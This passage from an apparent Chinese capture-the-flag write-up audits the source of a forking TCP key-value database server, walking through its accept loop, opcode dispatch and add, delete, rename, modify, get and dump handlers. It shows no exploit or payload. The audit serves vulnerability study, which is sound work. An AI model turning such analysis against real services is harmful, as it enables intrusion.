class="keyword">if</span> (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &amp;new_optval,</span><br><span class="line">                   <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): setsockopt()!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_addr.sin_family = AF_INET;</span><br><span class="line">    local_addr.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="comment">// listen addr</span></span><br><span class="line">    local_addr.sin_port = htons(socks_server_port);  <span class="comment">// listen port</span></span><br><span class="line">    <span class="keyword">socklen_t</span> local_addr_len = <span class="keyword">sizeof</span>(local_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(sock_fd, (struct sockaddr*)&amp;local_addr, local_addr_len) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): bind()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listen(sock_fd, max_requests) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): listen()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] Listen on port %d.\n&quot;</span>, getpid(), socks_server_port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> client_addr_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;client_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(client_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* loop */</span></span><br><span class="line">        <span class="keyword">if</span> ((client_fd = accept(sock_fd, (struct sockaddr*)&amp;client_addr,</span><br><span class="line">                                &amp;client_addr_len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;server_loop(): accept()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* get address info */</span></span><br><span class="line">            <span class="keyword">char</span> ip_str[INET_ADDRSTRLEN+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">            uint16 port;</span><br><span class="line">            inet_ntop(AF_INET, &amp;client_addr.sin_addr.s_addr, ip_str, <span class="keyword">sizeof</span>(ip_str));</span><br><span class="line">            port = ntohs(client_addr.sin_port);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* set TCP_NODELAY */</span></span><br><span class="line">            new_optval = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (setsockopt(client_fd, SOL_TCP, TCP_NODELAY, &amp;new_optval,</span><br><span class="line">                           <span class="keyword">sizeof</span>(new_optval)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                        <span class="string">&quot;Warnning: Can not setsockopt() for client_fd %d&quot;</span>,</span><br><span class="line">                        client_fd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* fork process */</span></span><br><span class="line">            <span class="keyword">int</span> pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// subprocess</span></span><br><span class="line">                    close(sock_fd);</span><br><span class="line">                    <span class="comment">/* set timeout */</span></span><br><span class="line">                    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">                        alarm(timeout);</span><br><span class="line">                        signal(SIGALRM, signal_handler);</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[%d] Connection Established - %s:%d\n&quot;</span>, getpid(), ip_str, port);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* handle */</span></span><br><span class="line">                    <span class="keyword">int</span> res = handle_request(client_fd);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/* normal exit */</span></span><br><span class="line">                    close_socket(client_fd);</span><br><span class="line">                    <span class="built_in">exit</span>(res);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// main process </span></span><br><span class="line">                    close(client_fd);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end loop */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>子进程调用<code>handle_request(fd)</code>函数处理请求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">handle_request</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_buf[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> op_buf[MAX_OP_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    uint16 op_len_be = <span class="number">0</span>;</span><br><span class="line">    uint16 op_len_le = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    FETCH_COMMAND:</span><br><span class="line">        <span class="comment">/* check MAGIC */</span></span><br><span class="line">        <span class="built_in">memset</span>(magic_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(magic_buf));</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        <span class="keyword">if</span> (readn(sock, magic_buf, MAGIC_SIZE) != MAGIC_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(magic_buf, MAGIC, MAGIC_SIZE)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Magic&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read op */</span></span><br><span class="line">        <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;op_len_be, <span class="keyword">sizeof</span>(uint16)) != <span class="keyword">sizeof</span>(uint16)) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        op_len_le = BigLittleSwap16(op_len_be);</span><br><span class="line">        <span class="keyword">if</span> (op_len_le &gt; MAX_OP_SIZE) &#123;</span><br><span class="line">            resp_str(sock, <span class="string">&quot;Bad Op Length&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(op_buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(op_buf));</span><br><span class="line">        readn(sock, op_buf, op_len_le);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* find handler */</span></span><br><span class="line">        op_handler* h = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (h = &amp;accepted_ops[<span class="number">0</span>]; h-&gt;opcode[<span class="number">0</span>] &amp;&amp; h-&gt;handler; h++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(op_buf, h-&gt;opcode, op_len_le)) &#123;</span><br><span class="line">                <span class="comment">/* call handler */</span></span><br><span class="line">                <span class="keyword">int</span> res = h-&gt;handler(sock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] op_handler_%s() return %d\n&quot;</span>, getpid(),</span><br><span class="line">                        h-&gt;opcode, res);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                <span class="keyword">goto</span> FETCH_COMMAND;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* unknown opcode return */</span></span><br><span class="line">        resp_str(sock, <span class="string">&quot;Op Not Found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先经过一些检查，然后根据报文里的内容调用对应函数，可选项一共有这些</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>, <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,<span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,<span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,<span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,<span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,<span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHU&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后这些选项对应的函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">op_handler</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> opcode[MAX_OP_SIZE + <span class="number">1</span>];</span><br><span class="line">    uint32 (*handler)(<span class="keyword">int</span>);</span><br><span class="line">&#125; accepted_ops[] = &#123;</span><br><span class="line">    &#123;OPCODE_ADD, op_handler_ADD&#125;,       &#123;OPCODE_DELETE, op_handler_DEL&#125;,</span><br><span class="line">    &#123;OPCODE_MODIFY, op_handler_MDF&#125;,    &#123;OPCODE_RENAME, op_handler_RNM&#125;,</span><br><span class="line">    &#123;OPCODE_COPY, op_handler_CPY&#125;,      &#123;OPCODE_GET, op_handler_GET&#125;,</span><br><span class="line">    &#123;OPCODE_SHUTDOWN, op_handler_SHUT&#125;, &#123;OPCODE_DUMP, op_handler_DUMP&#125;,</span><br><span class="line">    &#123;OPCODE_CLEAR, op_handler_CLR&#125;,     &#123;OPCODE_TREM, <span class="literal">NULL</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>其中比较关键的就是<code>op_handler_ADD()</code>,<code>op_handler_DEL</code>,<code>op_handler_RNM</code>,<code>op_handler_MDF</code>,<code>op_handler_GET</code>,<code>op_handler_DUMP</code>这几个函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">op_handler_ADD</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">add_data_item</span>(key, value, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Add Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DEL</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">delete_data_item</span>(key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Delete Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改value</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_MDF</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_value = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_value) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Value Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">modify_data_item</span>(key, new_value) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Modify Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改key</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_RNM</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Old Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* new_key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!new_key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;New Key Error&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* check dup */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_data_item</span>(new_key) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Duplicate Key&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rename_data_item</span>(key, new_key) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Rename Failed&quot;</span>);</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="built_in">release_data_t</span>(new_key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据key得到value的数据</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_GET</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span>* key = <span class="built_in">read_data_t</span>(sock);</span><br><span class="line">    <span class="keyword">if</span> (!key) &#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">data_t</span>* res = <span class="built_in">get_data_item</span>(key);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* return an empty type data_t */</span></span><br><span class="line">        <span class="keyword">data_t</span>* empty = (<span class="keyword">data_t</span>*)<span class="built_in">calloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (empty) &#123;</span><br><span class="line">            empty-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="built_in">do_resp</span>(sock, empty);</span><br><span class="line">            <span class="built_in">release_data_t</span>(empty);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Get Failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">release_data_t</span>(key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* success */</span></span><br><span class="line">    <span class="built_in">do_resp</span>(sock, res);</span><br><span class="line">    <span class="built_in">release_data_t</span>(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//得到整个数据库的内容</span></span><br><span class="line"><span class="function">uint32 <span class="title">op_handler_DUMP</span><span class="params">(<span class="keyword">int</span> sock)</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = <span class="built_in">dump_data_item</span>();</span><br><span class="line">    <span class="keyword">if</span>(!dump_array)&#123;</span><br><span class="line">        <span class="built_in">resp_str</span>(sock, <span class="string">&quot;Dump Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">do_resp</span>(sock, dump_array);</span><br><span class="line">    <span class="built_in">release_data_t</span>(dump_array);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中add函数是接收一个key和value然后放入database中，del函数就是根据key删除一对键值对，get就是根据key向用户发送对应的value,rnm就是重写一个key,mdf就是根据一个key重写一个value，dump就是把数据库里的所有数据全都发送给用户</p>
<p>处理用户输入的函数如下,就是根据不同的type创建不同的<code>data_t</code>，审完发现非常安全。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span>* <span class="title">read_data_t</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">do_read_data_t</span>(sock, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 